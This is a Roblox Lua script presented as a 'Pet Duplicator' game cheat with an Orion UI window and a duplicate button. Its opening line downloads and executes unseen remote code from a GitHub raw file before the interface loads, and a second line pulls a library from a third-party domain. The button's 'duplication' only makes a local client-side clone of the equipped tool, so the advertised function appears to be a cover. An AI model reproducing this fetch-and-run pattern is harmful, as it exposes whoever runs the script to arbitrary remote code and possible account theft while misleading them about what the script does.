loadstring(game:HttpGet("https://raw.githubusercontent.com/vince1212/1212/master/pet_dupe.lua"))()
local OrionLib = loadstring(game:HttpGet("https://twix.cyou/Orion.txt", true))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Window = OrionLib:MakeWindow({
    Name = "Pet Duplicator",
    SaveConfig = true,
    ConfigFolder = "petduplicator",
    IntroEnabled = true,
    IntroText = "Loading Script...",
    Icon = "rbxassetid://4483345998",
    IntroIcon = "rbxassetid://4483345998"
})

local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

MainTab:AddSection({
    Name = "Pet Duplication"
})

local status = MainTab:AddLabel(":white_circle: Waiting...")

MainTab:AddButton({
    Name = ":repeat: Duplicate Equipped Pet",
    Callback = function()
        local char = LocalPlayer.Character
        if not char then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Character not found.",
                Time = 3
            })
            status:Set(":x: Character not found.")
            return
        end

        local tool = char:FindFirstChildOfClass("Tool")
        if tool then
            local clone = tool:Clone()
            clone.Parent = LocalPlayer.Backpack
            OrionLib:MakeNotification({
                Name = "Success!",
                Content = "Pet duplicated: " .. tool.Name,
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            status:Set(":white_check_mark: Duplicated: " .. tool.Name)
        else
            OrionLib:MakeNotification({
                Name = "No Pet",
                Content = "No pet equipped to duplicate.",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            status:Set(":warning: No pet equipped.")
        end
    end
})

OrionLib:Init()
